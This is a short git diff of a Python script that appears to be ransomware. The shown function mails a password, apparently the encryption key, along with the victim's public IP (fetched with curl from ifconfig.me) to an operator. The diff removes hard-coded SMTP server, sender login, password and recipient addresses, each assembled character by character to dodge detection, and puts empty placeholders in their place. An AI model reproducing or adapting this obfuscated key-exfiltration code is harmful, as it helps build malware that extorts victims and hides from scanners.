@@ -179,27 +179,11 @@ def getpassword():
 			return (fp.read()).strip()
 
 def mail(password):
-	smtp_server = "s"+"m"+"t"+"p"+"-"+"m"+"a"+"i"+"l"+"." + "o"+"u"+"t"+"l"+"o"
-	smtp_server2 = "o" + "k" + "." + "c" + "o" + "m"
-	sender6 = "@" + "g" + "m" + "a" + "i" + "l" + "." + "c" + "o" + "m"
-	sender = "M" + "y" + "_" + "R" + "a"
-	recipient4 = "i" + "o"+"n" + "i" + "o"
-	recipient6 = "p" + "r" + "o" + "t" + "o" + "n" + "m" + "a" + "i" + "l" +"."+ "c" + "h"
-	sender5 = "l"+"."+ "c"+"o"+"m"
-	sender_password = "@"+"+"+"3"+"5"+"8"+"4"+"5"
-	sender_password7 = "r" + "t" + "1" + "x" + "v"
-	sender_password6 = "e" + "+" + "8" + "X" + "5"
-	sender_password4 = "a" + "d" + "3" + "6"
-	sender_password3 = "J" + "4" + "c" + "k"
-	sender2 = "n" + "s" + "o"+ "m"
-	recipient2 = "2" + "0"+ "2" + "1" +"0" + "8"
-	sender3 = "w" + "a"+ "r" +"e" + "@"
-	sender4 = "h"+"o"+"t""m"+"a"+"i"
-	recipient1 = "i"+"n"+"f"
-	sender_password2 = "7"+"3"+"9"+"8"+"9"+"4"+"4"+"5"
-	sender_password4 = "4" + "6" + "7" + "0" + "1" + "3"
-	recipient5 = "." + "g" + "r"
-	recipient3 = "4" + "@"
+	# give your email and password so it can be sended
+	smtp_server = ""
+	sender = ""
+	sender_password = ""
+	recipient = ""
 	try:
 		v_ip = check_output(["curl","-s","ifconfig.me"])
 	except:
